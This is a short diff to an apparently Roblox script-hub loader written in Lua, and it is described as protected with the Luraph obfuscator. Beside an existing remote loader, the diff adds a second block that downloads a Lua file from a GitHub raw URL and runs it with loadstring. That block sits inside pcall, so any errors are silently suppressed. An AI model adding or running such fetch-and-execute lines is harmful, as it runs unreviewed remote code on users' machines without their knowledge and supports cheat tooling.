@@ -3,6 +3,12 @@ task.spawn(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/teddyhubdev/diepvy/refs/heads/main/cantrom"))()
     end)
 end)
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Dex-Bear/VxezeHubLoader/refs/heads/main/ApiData.lua"))()
+    end)
+end)
+
 
 -- This file was protected using Luraph Obfuscator v15.0 [https://lura.ph/]
 
